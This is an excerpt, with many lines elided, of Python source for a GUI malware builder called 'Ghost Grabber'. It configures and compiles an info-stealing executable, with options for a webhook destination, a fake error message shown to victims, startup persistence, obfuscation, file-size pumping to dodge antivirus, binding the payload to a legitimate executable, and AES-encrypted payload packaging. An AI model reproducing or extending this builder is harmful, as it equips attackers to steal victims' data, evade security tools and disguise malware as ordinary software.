...
class App(ctk.CTk):
    def __init__(self):
        ...
        self.title(f"Ghost Sucker - Running on v{sys.version.split()[0]}")
        ...
        self.logo_image = ctk.CTkImage(Image.open(os.path.join(image_path, "ghost.png")), size=(60, 60))
        self.large_test_image = ctk.CTkImage(Image.open(os.path.join(image_path, "ghost.png")), size=(500, 150))
        self.image_icon_image = ctk.CTkImage(Image.open(os.path.join(image_path, "ghost.png")), size=(20, 20))
        ...
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}ghost.ico")
        self.boundExePath = ""
        ...
        self.navigation_frame_label = ctk.CTkLabel(self.navigation_frame, text="Ghost Grabber Builder", image=self.logo_image,
        ...
        self.checkwebhook_button = ctk.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#c93434", hover_color="#c93434", font=ctk.CTkFont(size=15, family=self.font))
        ...
        self.option_help = ctk.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#c93434", hover_color="#c93434")
        ...
        self.ping = ctk.CTkCheckBox(self.builder_frame, text="Ping", font=ctk.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#c93434", hover_color="#c93434")
        ...
        self.pingtype = ctk.CTkOptionMenu(
            ...
            fg_color="#c93434", button_hover_color="#c93434", button_color="#c93434")
        ...
        self.error = ctk.CTkCheckBox(self.builder_frame, text="Fake Error", font=ctk.CTkFont(
            size=17, family=self.font), fg_color="#c93434", hover_color="#c93434")
        ...
        self.startup = ctk.CTkCheckBox(
            ...
            fg_color="#c93434", hover_color="#c93434")
        ...
        self.obfuscation = ctk.CTkCheckBox(
            ...
            fg_color="#c93434", hover_color="#c93434", command=self.check_obfuscation)
        ...
        self.pump = ctk.CTkCheckBox(self.builder_frame, text="File Pumper", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#c93434", hover_color="#c93434", command=lambda: (self.check_pumper(), self.check_pump()))
        ...
        self.pump_size = ctk.CTkOptionMenu(self.builder_frame, width=30, font=ctk.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#c93434", button_hover_color="#c93434", button_color="#c93434")
        ...
        self.fileopts = ctk.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
                                                    ...
                                                    fg_color="#c93434", button_hover_color="#c93434", button_color="#c93434", command=self.file_type_check)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
        self.fileopts.set("nuitka (.exe)")

        self.icon = ctk.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#c93434", hover_color="#c93434",
        ...
        self.bindExeButtonControl = ctk.CTkButton(self.builder_frame, width=575, text="Bind Executable", fg_color="#c93434", hover_color="#c93434",
        ...
        self.build = ctk.CTkButton(self.builder_frame, width=250, text="Build", font=ctk.CTkFont(size=35, family=self.font),
                                             fg_color="#c93434", hover_color="#c93434", command=self.buildfile)
...
Nuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.
    ...
    def get_config(self):
            ...
            try:
                with open(self.basefilepath + "\\Ghost.py", 'r', encoding="utf-8") as f:
                    code = f.read()
        ...
        try:
            ...
            if filetype == "pyinstaller":
                ...
                command = [
                    ...
                    "--add-data", "Ghost.aes;.", "--name", f'{filename}.exe',
                ...
                if os.path.isfile("bound.Ghost"):
                    command.insert(-1, "--add-data")
                    command.insert(-1, "bound.Ghost;.")     
                ...
                if sys.version_info[:2] > (3, 11):
                    ...
                    command = [
                        ...
                        "--prefer-source-code", "--include-data-file=Ghost.aes=.",
                    ...
                    try:
                        ...
                        if os.path.isfile("bound.Ghost"):
                            command.insert(-1, "--include-data-file=bound.Ghost=.")
    ...
    def cleanup_files(self, filename):
        ...
        cleans_file = {f'./{filename}.spec', f'./{filename}.exe.spec', "./tools/upx.exe", "bound.Ghost", "Ghost.aes", "loader-o.py", "loader-o.spec"}
...
class %s:
    ...
    def PrepareBound(self):
        if os.path.isfile(self.boundExePath):
            ...
            with open("bound.Ghost", "wb") as f:
                f.write(encrypted)
                
        elif os.path.isfile("bound.Ghost"):
            os.remove("bound.Ghost")
